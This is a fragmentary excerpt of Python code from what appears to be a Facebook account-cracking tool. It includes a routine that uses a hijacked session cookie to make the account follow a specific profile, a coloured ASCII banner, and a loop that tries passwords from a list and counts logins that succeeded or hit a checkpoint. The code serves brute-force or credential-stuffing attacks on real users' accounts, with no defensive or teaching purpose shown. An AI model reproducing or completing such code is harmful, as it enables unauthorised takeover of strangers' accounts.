...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=RehanTalpur786', {
...
today = date.today()
logo =                                          ("""   
\033[1;32m   .88b      d88.  d8888b.   d888888b 
\033[1;33m   88  'YbdP'  88  88   `8D  `~~88~~' 
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write('\r\r%s[MRT] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
